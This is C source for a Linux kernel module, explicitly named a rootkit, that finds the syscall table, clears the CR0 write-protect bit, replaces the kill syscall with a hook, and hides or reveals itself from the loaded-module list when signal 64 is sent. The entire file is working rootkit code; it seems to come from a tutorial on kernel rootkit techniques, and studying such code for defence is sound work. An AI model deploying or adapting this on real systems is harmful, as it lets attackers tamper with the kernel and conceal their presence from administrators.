#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Syscall hijacking to send custom signals");
MODULE_VERSION("0.01");

static unsigned long * __sys_call_table;

/* orig_kill_t has to be declared to take pt_regs as as argument
 * so that we can access the variables stored in registers */
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
orig_kill_t orig_kill;

/* We need these for hiding/revealing the kernel module */
static struct list_head *prev_module;
static short hidden = 0;

/* After grabbing the sig out of the pt_regs struct, just check
 * for signal 64 (unused normally) and, using "hidden" as a toggle 
 * we either call hideme(), showme(), or the real sys_kill()
 * syscall with the arguments passed via pt_regs. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
	void showme(void);
	void hideme(void);

	// pid_t pid = regs->di;
	int sig = regs->si;

	if ( (sig == 64) && (hidden == 0) )
	{
		printk(KERN_INFO "Hiding rootkit kernel module...\n");
		hideme();
		hidden = 1;
	}
	else if ( (sig == 64) && (hidden == 1) )
	{
		printk(KERN_INFO "Revealing rootkit kernel module...\n");
		showme();
		hidden = 0;
	}
	else
	{
		return orig_kill(regs);
	}
}

/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */
void showme(void)
{
	list_add(&THIS_MODULE->list, prev_module);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

/* The built in linux write_cr0() function stops us from modifying
 * the WP bit, so we write our own instead */
inline void cr0_write(unsigned long cr0)
{
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
 * determines whether read-only pages can be written to. We are modifying
 * the syscall table, so we need to unset it first */
static inline void protect_memory(void)
{
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	cr0_write(cr0);
}

static inline void unprotect_memory(void)
{
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	cr0_write(cr0);
}

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Grab the syscall table */
	__sys_call_table = kallsyms_lookup_name("sys_call_table");

	/* Grab the function pointer to the real sys_kill syscall */
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

	printk(KERN_INFO "rootkit: Loaded >:-)\n");
	printk(KERN_DEBUG "rootkit: Found the syscall table at 0x%lx\n", __sys_call_table);
	printk(KERN_DEBUG "rootkit: kill @ 0x%lx\n", orig_kill);
	
	unprotect_memory();

	printk(KERN_INFO "rootkit: hooking kill syscall\n");
	/* Patch the function pointer to sys_kill with our hook instead */
	__sys_call_table[__NR_kill] = (unsigned long)hook_kill;

	protect_memory();

	return 0;
}

static void __exit rootkit_exit(void)
{
	unprotect_memory();
	
	printk(KERN_INFO "rootkit: restoring kill syscall\n");
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	
	protect_memory();
	
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
